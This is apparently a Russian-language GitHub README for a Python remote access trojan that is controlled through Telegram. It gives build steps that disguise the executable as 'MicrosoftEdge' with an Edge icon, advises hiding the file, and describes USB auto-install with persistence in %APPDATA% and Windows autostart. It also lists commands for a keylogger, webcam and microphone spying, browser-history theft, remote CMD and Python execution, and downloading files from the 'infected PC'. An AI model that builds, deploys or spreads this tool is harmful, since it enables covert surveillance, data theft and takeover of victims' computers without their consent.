# Telegram RAT Bot

![Preview](https://github.com/kripersi/RAT-tg-python/blob/main/screenshoots/main.png)

Этот бот позволяет удалённо управлять компьютером через Telegram. Он поддерживает команды для получения информации, выполнения скриптов, управления вводом, скачивания файлов и многого другого.

---------------------------
🔧 Установка
---------------------------

## 1. Установи Python 3.12
Скачай и установи Python с [официального сайта](https://www.python.org/downloads/).  
**Важно:** при установке отметь галочку `Add Python to PATH`.

## 2. Скачай скрипт
Способ 1:
```bash
git clone https://github.com/kripersi/RAT-tg-python.git
cd RAT-tg-python
```
Способ 2:
```bash
curl -O https://github.com/kripersi/RAT-tg-python/archive/refs/heads/main.zip
cd RAT-tg-python
```

## 3. Установи зависимости
```bash
pip install -r requirements.txt
```

## 4. Настрой бота
Открой файл config.py и укажи свои данные:
```bash
   token = 'YOUR_BOT_TOKEN'
   known_ids = ['YOUR_CHAT_ID']
```

## 5. Собери exe файл
```bash
pyinstaller --onefile --noconsole --icon=edgebrowser.ico --name=MicrosoftEdge main.py
```   

### 6. Дальше просто устанавливаешь этот exe на ~~любой ПК~~ и запускаешь, желательно exe файл не оставлять на видном месте


## 🚀 Автоустановка с флешки (Plug & Play)

Бот поддерживает **автоматическую установку** с USB-накопителя.

### Как работает:

1. Скопируйте `.exe` на флешку
2. Вставьте флешку в целевой компьютер
3. Запустите `.exe` с флешки
4. Бот **самостоятельно**:
   - Копирует себя в `%APPDATA%\SYSTEM`
   - Добавляет в автозагрузку Windows
   - Запускает копию из системы
   - Завершает процесс на флешке

> 💡 **После установки флешку можно извлечь** - бот продолжит работать из системы и будет запускаться при каждой загрузке

📋 Список команд
---------------------------

🤖 **Главное меню бота**


## 📌 Основные команды
- `/start` — Показать список команд
- `/ping` — Проверить активность бота

---

## 📷 Работа с изображениями и видео
- `/capture_pc` — Сделать скриншот экрана
- `/video_pc` — Записать видео с экрана
- `/capture_webcam` — Сделать фото с веб-камеры
- `/webcam_record` — Записать видео с веб-камеры
- `/click_image` — Кликнуть на место, которое на фото 
- `/wallpaper` — Установить обои на рабочий стол

---

## 🎤 Работа с микрофоном
- `/mic_record` — Записать звук с микрофона

---

## 📋 Буфер обмена
- `/clipboard_get` — Получить текст из буфера обмена
- `/clipboard_set` — Установить текст в буфер обмена

---

## 🔄 Процессы
- `/processes` — Показать список процессов с PID
- `/kill` — Убить процесс по PID

---

## 🔍 Информация о системе
- `/ip_info` — Показать IP и геолокацию
- `/pc_info` — Показать информацию о системе
- `/ls` — Показать содержимое папки
- `/drives` — Показать список дисков
- `/beep` — Издать звуковой сигнал

---

## 💻 Управление системой
- `/shutdown` — Выключить компьютер
- `/reboot` — Перезагрузить компьютер
- `/hot_keys` — Горячие клавиши (клавиатура)
- `/close_tabs` — Закрыть все открытые окна
- `/cmd_exec` — Выполнить команду через CMD
- `/open_browser` — Открыть браузер/ссылку
- `/python_exec` — Выполнить Python-выражение или скрипт

---

## 🔐 Логи и данные
- `/keylogs` — Показать логи клавиш (кейлоггер)
- `/user_log` — Показать логи пользователя
- `/chrome_log` — Извлечь историю Chrome
- `/edge_log` — Извлечь историю Edge

---

## 📥 Работа с файлами
- `/download` — Скачать файл с заражённого ПК
- `/download_file` — Сохранить файл на заражённый ПК (бот запросит файл)
- `/create_more_folders` — Создать папки с txt-файлами на рабочем столе
- `/run` — Запустить файл

---

## 🖱️ Управление мышью
- `/move_mouse_coord` — Переместить курсор в координаты
- `/move_mouse` — Сместить курсор (левее/правее/выше/ниже)
- `/click_left_mouse` — Кликнуть левой кнопкой мыши
- `/click_right_mouse` — Кликнуть правой кнопкой мыши
- `/double_click` — Двойной клик левой кнопкой мыши

---

## 📢 Взаимодействие с пользователем
- `/msg_box` — Показать сообщение на экране
- `/message_write` — Ввести текст в активное поле

---

## ⚠️ Опасные команды
- `/self_destruct` — Запрос на удаление бота
- `/destroy` — Полное удаление бота (после подтверждения)
